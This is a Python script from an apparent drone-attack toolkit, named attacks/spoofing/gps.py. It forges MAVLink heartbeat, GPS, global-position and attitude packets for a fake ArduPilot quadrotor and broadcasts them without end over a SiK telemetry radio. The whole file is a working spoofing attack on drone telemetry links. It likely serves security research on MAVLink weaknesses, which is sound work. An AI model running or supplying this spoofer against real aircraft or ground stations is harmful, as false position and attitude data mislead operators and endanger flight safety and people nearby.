from pymavlink import mavutil
import time
import sys

def create_mav():
    mav = mavutil.mavlink.MAVLink(None)
    mav.srcSystem = 1
    mav.srcComponent = 1
    return mav

def create_heartbeat(mav):
    return mav.heartbeat_encode(
        type=mavutil.mavlink.MAV_TYPE_QUADROTOR,
        autopilot=mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
        base_mode=mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
        custom_mode=3,
        system_status=mavutil.mavlink.MAV_STATE_ACTIVE
    ).pack(mav)

def create_gps_raw_int(mav):
    return mav.gps_raw_int_encode(
        time_usec=int(time.time() * 1e6),
        fix_type=3,
        lat=473566100,
        lon=854619300,
        alt=1500,
        eph=100,
        epv=100,
        vel=500,
        cog=0,
        satellites_visible=10
    ).pack(mav)

def create_global_position_int(mav):
    return mav.global_position_int_encode(
        time_boot_ms=int(time.time() * 1e3) % 4294967295,
        lat=473566100,
        lon=854619300,
        alt=1500000,
        relative_alt=1500000,
        vx=0,
        vy=0,
        vz=0,
        hdg=0
    ).pack(mav)

def create_attitude(mav):
    return mav.attitude_encode(
        time_boot_ms=int(time.time() * 1e3) % 4294967295,
        roll=0.1,
        pitch=0.1,
        yaw=1.0,
        rollspeed=0.01,
        pitchspeed=0.01,
        yawspeed=0.1
    ).pack(mav)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python attacks/spoofing/gps.py <serial_device>")
        print("Example: python attacks/spoofing/gps.py /dev/ttyUSB0")
        sys.exit(1)

    serial_device = sys.argv[1]
    baud_rate = 57600  # or 115200 depending on your SiK setup

    # Open serial connection to SiK radio
    conn = mavutil.mavlink_connection(serial_device, baud=baud_rate)
    mav = create_mav()

    while True:
        conn.write(create_heartbeat(mav))
        conn.write(create_gps_raw_int(mav))
        conn.write(create_global_position_int(mav))
        conn.write(create_attitude(mav))
        print(f"Sent spoofed MAVLink packets over {serial_device}")